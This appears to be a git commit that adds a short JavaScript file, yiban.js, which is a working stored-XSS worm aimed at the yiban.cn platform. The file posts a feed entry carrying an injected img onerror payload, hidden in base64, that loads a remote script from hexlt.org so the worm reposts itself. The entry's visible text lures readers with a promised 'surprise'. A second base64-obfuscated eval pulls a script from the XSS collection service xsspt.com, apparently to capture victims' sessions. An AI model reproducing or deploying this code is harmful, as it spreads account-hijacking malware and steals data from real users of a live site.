e1a72a39104743ef223ecfec1e44107caaa78d4b
iceyhexman <834430486@qq.com>
2017-10-20 20:46:07 +0800

    Add files via upload

---
+++ yiban.js
@@ -0,0 +1,8 @@
+$.ajax({
+  type: 'POST',
+  url: "http://www.yiban.cn/feed/add",
+  data: {content:"%22%3e%3cimg+src%3d%22ss%22+onerror%3d%22eval(atob(%27JC5nZXRTY3JpcHQoJ2h0dHA6Ly9oZXhsdC5vcmcveWliYW4uanMnKTs%3d%27))%3b%22%3e%e6%89%93%e5%bc%80%e7%bd%91%e9%a1%b5%e6%98%93%e7%8f%ad%e7%9c%8b%e7%9c%8b%ef%bc%8c%e6%9c%89%e6%83%8a%e5%96%9c+by+Hexman",privacy:"2",dom:".js-submit"},
+});
+
+eval(atob('JC5nZXRTY3JpcHQoJ2h0dHA6Ly94c3NwdC5jb20vMkNEbjNFPzE1MDg1MDA0NzAnKTs='))
+
